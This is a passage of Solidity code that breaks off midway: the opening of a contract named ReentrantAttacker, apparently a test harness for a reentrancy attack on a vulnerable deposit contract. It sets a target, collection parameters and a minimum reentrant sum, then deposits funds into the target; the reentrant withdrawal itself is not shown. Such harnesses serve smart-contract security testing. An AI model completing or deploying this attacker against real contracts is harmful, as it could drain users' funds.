contract ReentrantAttacker {
    C target;
    uint256 collectAmount;
    uint256 reentrantMinSum;
    bool hasReentered;

    function setTarget(address _target) external {
        target = C(_target);
    }

    function setCollectParams(uint256 _amount) external {
        collectAmount = _amount;
    }

    function setReentrantMinSum(uint256 _newMinSum) external {
        reentrantMinSum = _newMinSum;
    }

    function putFunds(uint256 _lockTime) external payable {
        require(address(target) != address(0), "Target not set");
        target.Put{value: msg.value}(_lockTime);
